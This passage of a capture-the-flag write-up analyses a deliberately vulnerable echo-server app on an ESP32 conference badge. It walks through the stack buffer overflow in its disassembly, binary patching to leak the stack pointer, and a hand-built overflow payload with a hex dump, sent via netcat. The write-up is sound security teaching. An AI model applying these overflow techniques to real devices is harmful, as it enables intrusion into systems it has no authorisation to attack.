+<h2><a class="toc-backref" href="#id21">Coffee Break</a><a class="headerlink" href="#coffee-break" title="Permalink to this headline">#</a></h2>
+<p>Now might be a good time to go grab a beverage of your liking and let the previous chapters sink in while pondering your life choices. It’s never too late to take up a career in herding sheep or woodworking, y’know? Just sayin’.</p>
+<p>Ah, who am I kidding? Take your time to finish your drink before we move on though. Hydration is important, as is time to let things settle.</p>
+<p>Go on, <a class="reference external" href="https://www.youtube.com/watch?v=Ur1XtSyjbxM">I’ll wait</a>.</p>
+</section>
+<section id="reversing-the-echo-server-part-two-electric-boogaloo">
+<h2><a class="toc-backref" href="#id22">Reversing the echo server, part two: Electric Boogaloo</a><a class="headerlink" href="#reversing-the-echo-server-part-two-electric-boogaloo" title="Permalink to this headline">#</a></h2>
+<p>Awright, now with that architecture knowledge under our belt and a freshly caffeinated brain, let’s finally dive into the <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> function and see if we can spot the bug!</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      <span class="o">**************************************************************</span>
+                      <span class="o">*</span>                          <span class="n">FUNCTION</span>                          <span class="o">*</span>
+                      <span class="o">**************************************************************</span>
+                      <span class="n">_Bool</span> <span class="n">__stdcall</span> <span class="n">do_echo</span><span class="p">(</span><span class="nb">int</span> <span class="n">sock</span><span class="p">)</span>
+      <span class="n">_Bool</span>             <span class="n">a2</span><span class="p">:</span><span class="mi">1</span>           <span class="o">&lt;</span><span class="n">RETURN</span><span class="o">&gt;</span>
+      <span class="nb">int</span>               <span class="n">a2</span><span class="p">:</span><span class="mi">4</span>           <span class="n">sock</span>
+      <span class="n">char</span><span class="p">[</span><span class="mi">32</span><span class="p">]</span>          <span class="n">Stack</span><span class="p">[</span><span class="o">-</span><span class="mh">0x40</span><span class="p">]</span>   <span class="n">small_buf</span>
+                      <span class="n">do_echo</span>
+<span class="mi">400</span><span class="n">d7328</span> <span class="mi">36</span> <span class="mi">81</span> <span class="mi">00</span>        <span class="n">entry</span>      <span class="n">a1</span><span class="p">,</span><span class="mh">0x40</span>
+</pre></div>
+</div>
+<p>This already tells us a lot about the function’s stack layout, given what we just learned:</p>
+<ul class="simple">
+<li><p>The function reserves 64 bytes on the stack. We can see below that it’s using <code class="docutils literal notranslate"><span class="pre">call8</span></code> calls throughout, so 32 of those bytes will be reserved for register save areas, split into the base save area right below the stack pointer (<code class="docutils literal notranslate"><span class="pre">a1</span> <span class="pre">-</span> <span class="pre">16</span></code> through <code class="docutils literal notranslate"><span class="pre">a1</span></code>) and the extended save area (<code class="docutils literal notranslate"><span class="pre">a1</span> <span class="pre">+</span> <span class="pre">32</span></code> through <code class="docutils literal notranslate"><span class="pre">a1</span> <span class="pre">+</span> <span class="pre">48</span></code>).</p></li>
+<li><p>The space in between those save areas (<code class="docutils literal notranslate"><span class="pre">a1</span></code> through <code class="docutils literal notranslate"><span class="pre">a1</span> <span class="pre">+</span> <span class="pre">32</span></code>) makes up the locals of <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> - which the debug information conveniently informs us is a single buffer of 32 bytes.</p></li>
+</ul>
+<p>Hmm, a 32 byte buffer on the stack, and previously the echo server was behaving oddly when we sent it more than 32 bytes of stuff at once… I betcha that’s the buffer that overflows! Let’s see where it’s being used:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>    <span class="mi">400</span><span class="n">d733d</span> <span class="mi">3</span><span class="n">d</span> <span class="mi">01</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a3</span><span class="p">,</span><span class="n">a1</span>
+ <span class="o">/-</span> <span class="mi">400</span><span class="n">d733f</span> <span class="mi">46</span> <span class="mi">00</span> <span class="mi">00</span>        <span class="n">j</span>          <span class="n">LAB_400d7344</span>
+ <span class="o">|</span>                        <span class="n">LAB_400d7342</span>
+<span class="o">/--&gt;</span><span class="mi">400</span><span class="n">d7342</span> <span class="mi">3</span><span class="n">d</span> <span class="mi">0</span><span class="n">c</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a3</span><span class="p">,</span><span class="n">a12</span>
+<span class="o">||</span>                        <span class="n">LAB_400d7344</span>
+<span class="o">|</span>\<span class="o">-&gt;</span><span class="mi">400</span><span class="n">d7344</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">0</span><span class="n">d</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a13</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="o">|</span>   <span class="mi">400</span><span class="n">d7346</span> <span class="n">c2</span> <span class="n">a0</span> <span class="mi">01</span>        <span class="n">movi</span>       <span class="n">a12</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="o">|</span>   <span class="mi">400</span><span class="n">d7349</span> <span class="n">bd</span> <span class="mi">03</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a11</span><span class="p">,</span><span class="n">a3</span>
+<span class="o">|</span>   <span class="mi">400</span><span class="n">d734b</span> <span class="mi">20</span> <span class="n">a2</span> <span class="mi">20</span>        <span class="n">mov</span>        <span class="n">a10</span><span class="p">,</span><span class="n">sock</span>
+<span class="o">|</span>   <span class="mi">400</span><span class="n">d734e</span> <span class="mi">25</span> <span class="n">ba</span> <span class="mi">29</span>        <span class="n">call8</span>      <span class="n">lwip_recv</span>
+<span class="o">|/-</span> <span class="mi">400</span><span class="n">d7351</span> <span class="mi">96</span> <span class="mi">3</span><span class="n">a</span> <span class="mi">03</span>        <span class="n">bltz</span>       <span class="n">a10</span><span class="p">,</span><span class="n">LAB_400d7388</span>
+<span class="o">||</span>  <span class="mi">400</span><span class="n">d7354</span> <span class="mi">1</span><span class="n">b</span> <span class="n">c3</span>           <span class="n">addi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a12</span><span class="p">,</span><span class="n">a3</span><span class="p">,</span><span class="mh">0x1</span>
+<span class="o">||</span>  <span class="mi">400</span><span class="n">d7356</span> <span class="mi">32</span> <span class="mi">03</span> <span class="mi">00</span>        <span class="n">l8ui</span>       <span class="n">a3</span><span class="o">=&gt;</span><span class="n">Stack</span><span class="p">[</span><span class="mh">0x0</span><span class="p">],</span><span class="n">a3</span><span class="p">,</span><span class="mh">0x0</span>
+\<span class="o">+-</span> <span class="mi">400</span><span class="n">d7359</span> <span class="mi">66</span> <span class="mi">93</span> <span class="n">e5</span>        <span class="n">bnei</span>       <span class="n">a3</span><span class="p">,</span><span class="mh">0xa</span><span class="p">,</span><span class="n">LAB_400d7342</span>
+ <span class="n">v</span>
+</pre></div>
+</div>
+<p>Transcribed, this loop does the following:</p>
+<ol class="arabic simple">
+<li><p>Initialize <code class="docutils literal notranslate"><span class="pre">a3</span></code> to point to the start of the buffer (at <code class="docutils literal notranslate"><span class="pre">a1</span></code> since that’s the start of our locals and the buffer is our only local).</p></li>
+<li><p>Call <code class="docutils literal notranslate"><span class="pre">lwip_recv(sock,</span> <span class="pre">a3,</span> <span class="pre">1,</span> <span class="pre">0)</span></code>, i.e. attempt to receive one byte into the buffer at location <code class="docutils literal notranslate"><span class="pre">a3</span></code>.</p></li>
+<li><p>If <code class="docutils literal notranslate"><span class="pre">lwip_recv</span></code> fails, abort (jump target outside the snippet).</p></li>
+<li><p>Store the location of the next byte in <code class="docutils literal notranslate"><span class="pre">r12</span></code>.</p></li>
+<li><p>Load the byte we just received and compare to 0x0a (i.e. a newline).</p></li>
+<li><p>If it’s not a newline, repeat from step 2 with <code class="docutils literal notranslate"><span class="pre">a3</span></code> pointing to the next byte in the buffer; else fall through.</p></li>
+</ol>
+<p>You immediately noticed the absence of a check for buffer overflow, didn’t you? This code will happily receive bytes until it encounters a newline, overwriting the entire stack if necessary. There’s our buffer overflow - <strong>we have full control over the stack leading up to ``do_echo``.</strong></p>
+<p>Before we race to craft an exploit though, let’s continue looking at <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> and see what else it can tell us:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d735c</span> <span class="mi">10</span> <span class="mi">3</span><span class="n">c</span> <span class="n">c0</span>        <span class="n">sub</span>        <span class="n">a3</span><span class="p">,</span><span class="n">a12</span><span class="p">,</span><span class="n">a1</span>
+<span class="mi">400</span><span class="n">d735f</span> <span class="mi">41</span> <span class="n">d5</span> <span class="n">e4</span>        <span class="n">l32r</span>       <span class="n">a4</span><span class="p">,</span><span class="o">-&gt;</span><span class="n">TAG</span>
+<span class="mi">400</span><span class="n">d7362</span> <span class="mi">58</span> <span class="mi">04</span>           <span class="n">l32i</span><span class="o">.</span><span class="n">n</span>     <span class="n">a5</span><span class="p">,</span><span class="n">a4</span><span class="o">=&gt;</span><span class="n">TAG</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">400</span><span class="n">d7364</span> <span class="mi">25</span> <span class="n">b8</span> <span class="n">b9</span>        <span class="n">call8</span>      <span class="n">esp_log_timestamp</span>
+<span class="mi">400</span><span class="n">d7367</span> <span class="n">fd</span> <span class="mi">03</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a15</span><span class="p">,</span><span class="n">a3</span>
+<span class="mi">400</span><span class="n">d7369</span> <span class="n">e8</span> <span class="mi">04</span>           <span class="n">l32i</span><span class="o">.</span><span class="n">n</span>     <span class="n">a14</span><span class="p">,</span><span class="n">a4</span><span class="o">=&gt;</span><span class="n">TAG</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">400</span><span class="n">d736b</span> <span class="n">dd</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a13</span><span class="p">,</span><span class="n">a10</span>
+<span class="mi">400</span><span class="n">d736d</span> <span class="n">c1</span> <span class="n">d2</span> <span class="n">e4</span>        <span class="n">l32r</span>       <span class="n">a12</span><span class="p">,</span><span class="n">PTR_s__</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">32</span><span class="n">mI_</span><span class="p">(</span><span class="o">%</span><span class="n">u</span><span class="p">)</span><span class="n">_</span><span class="o">%</span><span class="n">s</span><span class="p">:</span><span class="n">_Received_</span><span class="o">%</span><span class="n">i_by_400</span>
+                                        <span class="s2">&quot;\e[0;32mI (</span><span class="si">%u</span><span class="s2">) </span><span class="si">%s</span><span class="s2">: Received </span><span class="si">%i</span><span class="s2"> bytes\e[0m</span><span class="se">\n</span><span class="s2">&quot;</span>
+<span class="mi">400</span><span class="n">d7370</span> <span class="n">bd</span> <span class="mi">05</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a11</span><span class="p">,</span><span class="n">a5</span>
+<span class="mi">400</span><span class="n">d7372</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">3</span><span class="n">a</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a10</span><span class="p">,</span><span class="mh">0x3</span>
+<span class="mi">400</span><span class="n">d7374</span> <span class="n">a5</span> <span class="n">aa</span> <span class="n">b9</span>        <span class="n">call8</span>      <span class="n">esp_log_write</span>
+</pre></div>
+</div>
+<p>Ah, so it determines the amount of bytes received (by subtracting <code class="docutils literal notranslate"><span class="pre">a1</span></code> from <code class="docutils literal notranslate"><span class="pre">a12</span></code>) and then logs them to the console. I remember seeing that log earlier.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">400</span><span class="n">d7377</span> <span class="mi">0</span><span class="n">c</span> <span class="mi">0</span><span class="n">d</span>           <span class="n">movi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a13</span><span class="p">,</span><span class="mh">0x0</span>
+<span class="mi">400</span><span class="n">d7379</span> <span class="n">cd</span> <span class="mi">03</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a12</span><span class="p">,</span><span class="n">a3</span>
+<span class="mi">400</span><span class="n">d737b</span> <span class="n">bd</span> <span class="mi">01</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a11</span><span class="p">,</span><span class="n">a1</span>
+<span class="mi">400</span><span class="n">d737d</span> <span class="n">ad</span> <span class="mi">02</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">a10</span><span class="p">,</span><span class="n">sock</span>
+<span class="mi">400</span><span class="n">d737f</span> <span class="n">e5</span> <span class="n">d0</span> <span class="mi">29</span>        <span class="n">call8</span>      <span class="n">lwip_send</span>
+</pre></div>
+</div>
+<p>And then it sends the entire buffer back to the client using <code class="docutils literal notranslate"><span class="pre">lwip_send</span></code>. Let’s keep this in mind - wouldn’t it be ace if we could use the same function in our exploit to send back the flag?</p>
+<p>Let’s summarize, what do we have and not have?</p>
+<blockquote class="highlights">
+<div><p>We have:</p>
+<ol class="arabic simple">
+<li><p>A way to overwrite the stack from <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>’s frame upwards.</p></li>
+<li><p>A function we can call to send arbitrary memory contents back to the client.</p></li>
+<li><p>A scratch pad on the stack (the 32 byte buffer) we have direct control over.</p></li>
+</ol>
+<p>We don’t have:</p>
+<ol class="arabic simple">
+<li><p>A way to read the stack</p></li>
+</ol>
+</div></blockquote>
+<p>Given the use of <code class="docutils literal notranslate"><span class="pre">call8</span></code> everywhere and the tall chain of recursive stack frames conveniently laid out for us, this means we have direct control over <code class="docutils literal notranslate"><span class="pre">r0..r7</span></code>. Taking into account the moving register window, across two consecutive stack frames we even have control over <em>all</em> registers.</p>
+<p>The lack of a stack read primitive means we have to construct the entire stack by hand, or figure out how to attach a debugger and dump the stack. I chose the former, but for that we’ll need the value of the stack pointer during <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> execution.</p>
+<p>Luckily we have a convenient method of extracting that value already in the app!</p>
+</section>
+<section id="dude-where-s-my-stack">
+<h2><a class="toc-backref" href="#id23">Dude, where’s my stack?!</a><a class="headerlink" href="#dude-where-s-my-stack" title="Permalink to this headline">#</a></h2>
+<p>The devs were so friendly and put a debug trace right into <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> that we can use to extract the value of any register, including the stack pointer. Basically it just requires patching a single instruction:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">400d7367</span> <span class="pre">fd</span> <span class="pre">03</span>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; <span class="pre">mov.n</span>&#160;&#160;&#160;&#160;&#160; <span class="pre">a15,a3</span></code></p>
+</div></blockquote>
+<p>into</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">mov.n</span>&#160;&#160; <span class="pre">a15,a1</span></code></p>
+</div></blockquote>
+<p>We don’t even have to know the instruction encoding, Ghidra can do that for us. Move to the instruction and hit <code class="docutils literal notranslate"><span class="pre">Ctrl-Shift-G</span></code> for “Patch instruction” (yes yes, the assembler has not been tested yadda yadda, it’s ok, we know what we’re doing), change the register and you won’t even have to <em>actually</em> patch the instruction in your database because Ghidra already tells you the encoding:</p>
+<img alt="_images/insnpatch.png" src="_images/insnpatch.png" />
+<p>So all we have to do is make a copy of <code class="docutils literal notranslate"><span class="pre">hack_me_if_you_can.elf</span></code>, replace <code class="docutils literal notranslate"><span class="pre">25</span> <span class="pre">b8</span> <span class="pre">b9</span> <span class="pre">fd</span> <span class="pre">03</span></code> (only one occurrence, yay!) with <code class="docutils literal notranslate"><span class="pre">25</span> <span class="pre">b8</span> <span class="pre">b9</span> <span class="pre">fd</span> <span class="pre">01</span></code>, and for printout convenience, also replace <code class="docutils literal notranslate"><span class="pre">Received</span> <span class="pre">%i</span> <span class="pre">bytes</span></code> by <code class="docutils literal notranslate"><span class="pre">Received</span> <span class="pre">%p</span> <span class="pre">bytes</span></code> so that we get a nice hex value.</p>
+<p>Now we can use <a class="reference external" href="https://github.com/espressif/esptool">esptool</a> to convert our patched ELF to an app binary:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">esptool.py</span> <span class="pre">elf2image</span> <span class="pre">hack_me_if_you_patch.elf</span></code></p>
+</div></blockquote>
+<p>and upload that to the badge using the <a class="reference external" href="https://github.com/badgeteam/mch2022-tools/archive/refs/heads/master.zip">mch2022-tools</a>:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">webusb_push.py</span> <span class="pre">hax</span> <span class="pre">hack_me_if_you_patch.bin</span></code></p>
+</div></blockquote>
+<p>Connect to the USB console, start the patched app, connect using netcat and send whatever, you’ll see this:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">I</span> <span class="pre">(14768)</span> <span class="pre">hack-me-if-you-can:</span> <span class="pre">Received</span> <span class="pre">0x3ffbf170</span> <span class="pre">bytes</span></code></p>
+</div></blockquote>
+<p>And that’s our stack pointer!</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>Of course, you could also simply insert an illegal instruction (try <code class="docutils literal notranslate"><span class="pre">00</span> <span class="pre">00</span> <span class="pre">00</span></code>) to get a guru meditation that dumps all registers at once. That would have probably been a lot easier and doesn’t require a conveniently located debug print either.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>This stack pointer value <em>is not stable</em> between environments! Throughout the camp, connected to the camp WiFi I had a stable value of 0x3ffc0cd0. Back home in my home WiFi the value is now 0x3ffbf170. Your value may be different yet. I’m going to construct my exploits below using 0x3ffbf170 but keep in mind that <em>you may have to use different values</em>.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>Do not attempt to patch the ESP .bin unless you absolutely have to - it’s protected by checksums and hashes that will prevent a patched binary from being loaded. It’s much easier to patch the ELF and use esptool to generate the .bin.</p>
+</div>
+</section>
+<section id="crafting-an-exploit-act-1-please-don-t-crash">
+<h2><a class="toc-backref" href="#id24">Crafting an exploit, act 1: Please don’t crash</a><a class="headerlink" href="#crafting-an-exploit-act-1-please-don-t-crash" title="Permalink to this headline">#</a></h2>
+<p>We finally have all we need to craft a first exploit payload. Let’s gently feel our way forward and first try to construct a stack that won’t horribly crash on us, i.e. try to reconstruct the original stack. If we can send this stack image over to the buggy app without it crashing we’ll know our understanding so far is correct.</p>
+<section id="setting-up-a-template">
+<h3>Setting up a template<a class="headerlink" href="#setting-up-a-template" title="Permalink to this headline">#</a></h3>
+<p>There might be plenty of awesome tools for crafting stack payloads around, but I simply used a hex editor :) Let’s start by writing a text file in a text editor:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">asdfasdfasdfasdfasdfasdfasdfasdfA4A4A5A5A6A6A7A7C0C0C1C1C2C2C3C3B4B4B5B5B6B6B7B7D0D0D1D1D2D2D3D3C4C4C5C5C6C6C7C7E0E0E1E1E2E2E3E3D4D4D5D5D6D6D7D7F0F0F1F1F2F2F3F3E4E4E5E5E6E6E7E\n</span></code></p>
+</div></blockquote>
+<p>One line, no line breaks except the one at the very end. Make sure it’s Unix encoded so the <code class="docutils literal notranslate"><span class="pre">\n</span></code> is a single 0x0A byte. Save the file as <code class="docutils literal notranslate"><span class="pre">payload1-nocrash.bin</span></code>, and re-open in your favorite hex editor. Here’s the file layout:</p>
+<dl class="simple">
+<dt><code class="docutils literal notranslate"><span class="pre">asdfasdfasdfasdfasdfasdfasdfasdf</span></code>:</dt><dd><p>The 32-byte receive buffer.</p>
+</dd>
+<dt><code class="docutils literal notranslate"><span class="pre">A4A4A5A5A6A6A7A7</span></code>:</dt><dd><p>Extra save area for <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>’s stack frame, dubbed frame A from now on. <code class="docutils literal notranslate"><span class="pre">A4A4</span></code> is <code class="docutils literal notranslate"><span class="pre">a4</span></code>, <code class="docutils literal notranslate"><span class="pre">A5A5</span></code> is <code class="docutils literal notranslate"><span class="pre">a5</span></code> and so on.</p>
+</dd>
+<dt><code class="docutils literal notranslate"><span class="pre">C0C0C1C1C2C2C3C3</span></code>:</dt><dd><p>Base save area for the stack frame two above <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>, dubbed frame C.</p>
+</dd>
+</dl>
+<p>And so forth for the stack frames further up. All those frames are <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> so we know there are no locals in between the save areas.</p>
+<p>There’s no specific method to the amount of stack frames I put in there; there are a few constraints though:</p>
+<ul class="simple">
+<li><p>We must not overwrite <em>too many</em> frames or we’ll eventually end up returning from <code class="docutils literal notranslate"><span class="pre">echo_server</span></code> itself. The RTOS doesn’t like that, btdt. So let’s keep the number of frames below 9-ish.</p></li>
+<li><p>We may need more than one full set of registers later, so let’s put more frames in than just one or two, for good measure.</p></li>
+</ul>
+<p>Between those constraints, three full stack frames (C, D and E) felt like an okay starting point. If we need more we’ll add them later.</p>
+<p>With that, we can now replace register values in all the stack frames from B upwards; the frame A extra save area will be overwritten by register values saved during the <code class="docutils literal notranslate"><span class="pre">lwip_recv</span></code> calls - looks like they have a proper long call chain inside. Luckily we don’t have to be careful not to clobber any registers in <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> since all it does is return.</p>
+</section>
+<section id="choosing-register-values">
+<h3>Choosing register values<a class="headerlink" href="#choosing-register-values" title="Permalink to this headline">#</a></h3>
+<p>All we’d like to do for now is guess register values that won’t cause the program to crash. Since <code class="docutils literal notranslate"><span class="pre">a2..a8</span></code> aren’t being used in the return path of <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> we don’t have to deal with their values right now. What’s important is the return addresses in <code class="docutils literal notranslate"><span class="pre">r0</span></code> and stack pointers in <code class="docutils literal notranslate"><span class="pre">r1</span></code>.</p>
+<p>Let’s start with the first pair of these, in the frame C base save area. Let’s think for a second: Frame A is <code class="docutils literal notranslate"><span class="pre">do_echo</span></code>, so frame B is the <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> call which ends up calling <code class="docutils literal notranslate"><span class="pre">do_echo</span></code> and frame C is one of the many <code class="docutils literal notranslate"><span class="pre">do_echo_recursive</span></code> calls which call themselves. So the return address for frame C should point here:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      <span class="n">LAB_400d739c</span>
+<span class="mi">400</span><span class="n">d739c</span> <span class="mi">0</span><span class="n">b</span> <span class="n">b3</span>           <span class="n">addi</span><span class="o">.</span><span class="n">n</span>     <span class="n">a11</span><span class="p">,</span><span class="n">count</span><span class="p">,</span><span class="o">-</span><span class="mh">0x1</span>
+<span class="mi">400</span><span class="n">d739e</span> <span class="n">e5</span> <span class="n">fe</span> <span class="n">ff</span>        <span class="n">call8</span>      <span class="n">do_echo_recursive</span>
+                      <span class="n">LAB_400d73a1</span>
+<span class="mi">400</span><span class="n">d73a1</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">0</span><span class="n">a</span>           <span class="n">mov</span><span class="o">.</span><span class="n">n</span>      <span class="n">sock</span><span class="p">,</span><span class="n">a10</span>     <span class="o">&lt;=====</span> <span class="n">HERE</span>
+<span class="mi">400</span><span class="n">d73a3</span> <span class="mi">1</span><span class="n">d</span> <span class="n">f0</span>           <span class="n">retw</span><span class="o">.</span><span class="n">n</span>
+</pre></div>
+</div>
+<p>But you know what? This would clobber any value we may have painstakingly put into <code class="docutils literal notranslate"><span class="pre">a2</span></code>, so let’s deviate from the original flow a bit and skip that <code class="docutils literal notranslate"><span class="pre">mov</span></code> instruction. Let’s use the address of the <code class="docutils literal notranslate"><span class="pre">retw</span></code> instead.</p>
+<p>Also, this is a great moment to remember how the topmost two bits of the return address <em>actually</em> encode the amount to shift the register window when returning? We better encode the right value in here! Since we’re using <code class="docutils literal notranslate"><span class="pre">call8</span></code> everywhere that would be <code class="docutils literal notranslate"><span class="pre">0b10</span></code>.</p>
+<p>With all that in mind, we can craft our first register value:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">r0</span> <span class="pre">=</span> <span class="pre">0x800d73a3</span></code></p>
+</div></blockquote>
+<p>Let’s think about the stack pointer next. We know the stack pointer value for frame A, 0x3ffbf170. The size of that frame is 0x40, so the stack pointer for frame B would be 0x3ffbf1b0. That frame and all that follow are 0x20 bytes, so the stack pointer of frame C would be 0x3ffbf1d0:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">r1</span> <span class="pre">=</span> <span class="pre">0x3ffbf1d0</span></code></p>
+</div></blockquote>
+</section>
+<section id="putting-it-all-together">
+<h3>Putting it all together<a class="headerlink" href="#putting-it-all-together" title="Permalink to this headline">#</a></h3>
+<p>Neat, let’s put that into our payload! Keeping in mind that values are stored in little-endian order, we can change this:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">0030:</span> <span class="pre">43</span> <span class="pre">30</span> <span class="pre">43</span> <span class="pre">30</span> <span class="pre">43</span> <span class="pre">31</span> <span class="pre">43</span> <span class="pre">31</span> <span class="pre">43</span> <span class="pre">32</span> <span class="pre">43</span> <span class="pre">32</span> <span class="pre">43</span> <span class="pre">33</span> <span class="pre">43</span> <span class="pre">33</span>&#160; <span class="pre">C0C0C1C1C2C2C3C3</span></code></p>
+</div></blockquote>
+<p>into this:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">0030:</span> <span class="pre">a3</span> <span class="pre">73</span> <span class="pre">0d</span> <span class="pre">80</span> <span class="pre">d0</span> <span class="pre">f1</span> <span class="pre">fb</span> <span class="pre">3f</span> <span class="pre">43</span> <span class="pre">32</span> <span class="pre">43</span> <span class="pre">32</span> <span class="pre">43</span> <span class="pre">33</span> <span class="pre">43</span> <span class="pre">33</span>&#160; <span class="pre">.s.....?C2C2C3C3</span></code></p>
+</div></blockquote>
+<p>For stack frames D, E and F we can reuse the same value for <code class="docutils literal notranslate"><span class="pre">r0</span></code> since we want to return to the same location, but we have to update the stack pointers to the corresponding next stack frame. That’s easy though since each frame is 0x20 bytes long so we just have to keep adding 0x20 each time:</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">xxd</span> <span class="pre">-g1</span> <span class="pre">payload1-nocrash.bin</span></code></p>
+</div></blockquote>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>00000000: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000010: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000020: 41 34 41 34 41 35 41 35 41 36 41 36 41 37 41 37  A4A4A5A5A6A6A7A7
+00000030: a3 73 0d 80 d0 f1 fb 3f 43 32 43 32 43 33 43 33  .s.....?C2C2C3C3
+00000040: 42 34 42 34 42 35 42 35 42 36 42 36 42 37 42 37  B4B4B5B5B6B6B7B7
+00000050: a3 73 0d 80 f0 f1 fb 3f 44 32 44 32 44 33 44 33  .s.....?D2D2D3D3
+00000060: 43 34 43 34 43 35 43 35 43 36 43 36 43 37 43 37  C4C4C5C5C6C6C7C7
+00000070: a3 73 0d 80 10 f2 fb 3f 45 32 45 32 45 33 45 33  .s.....?E2E2E3E3
+00000080: 44 34 44 34 44 35 44 35 44 36 44 36 44 37 44 37  D4D4D5D5D6D6D7D7
+00000090: a3 73 0d 80 30 f2 fb 3f 46 32 46 32 46 33 46 33  .s..0..?F2F2F3F3
+000000a0: 45 34 45 34 45 35 45 35 45 36 45 36 45 37 45 0a  E4E4E5E5E6E6E7E.
+</pre></div>
+</div>
+<p>Let’s give this a shot!</p>
+<blockquote>
+<div><p><code class="docutils literal notranslate"><span class="pre">cat</span> <span class="pre">payload1-nocrash.bin</span> <span class="pre">|</span> <span class="pre">nc</span> <span class="pre">-N</span> <span class="pre">192.168.178.50</span> <span class="pre">1337</span> <span class="pre">|</span> <span class="pre">dd</span> <span class="pre">bs=1</span> <span class="pre">skip=22</span> <span class="pre">|</span> <span class="pre">xxd</span> <span class="pre">-g</span> <span class="pre">1</span></code></p>
+</div></blockquote>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>00000000: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000010: 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66  asdfasdfasdfasdf
+00000020: 90 0a fb 3f 00 39 40 3f 41 36 41 36 41 37 41 37  ...?.9@?A6A6A7A7
+00000030: a3 73 0d 80 d0 f1 fb 3f 43 32 43 32 43 33 43 33  .s.....?C2C2C3C3
+00000040: 42 34 42 34 42 35 42 35 42 36 42 36 42 37 42 37  B4B4B5B5B6B6B7B7
+00000050: a3 73 0d 80 f0 f1 fb 3f 44 32 44 32 44 33 44 33  .s.....?D2D2D3D3
+00000060: 43 34 43 34 43 35 43 35 43 36 43 36 43 37 43 37  C4C4C5C5C6C6C7C7
+00000070: a3 73 0d 80 10 f2 fb 3f 45 32 45 32 45 33 45 33  .s.....?E2E2E3E3
+00000080: 44 34 44 34 44 35 44 35 44 36 44 36 44 37 44 37  D4D4D5D5D6D6D7D7
+00000090: a3 73 0d 80 30 f2 fb 3f 46 32 46 32 46 33 46 33  .s..0..?F2F2F3F3
+000000a0: 45 34 45 34 45 35 45 35 45 36 45 36 45 37 45 0a  E4E4E5E5E6E6E7E.
+</pre></div>
+</div>
+<p>Yep, that’s our payload back, mostly unscathed! And the app didn’t crash - we can repeat this ad nauseam :) Pat yourself on the shoulder, we came a long way!</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>The <code class="docutils literal notranslate"><span class="pre">dd</span> <span class="pre">bs=1</span> <span class="pre">skip=22</span></code> in the chain is just there to remove the <code class="docutils literal notranslate"><span class="pre">Connection</span> <span class="pre">accepted!</span></code> message the badge sends us upon connection.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Warning</p>
+<p>If this payload doesn’t work for you and instead crashes the badge, chances are you have a different stack pointer than I and have not yet adapted the payload to your specific stack pointer value.</p>
+</div>
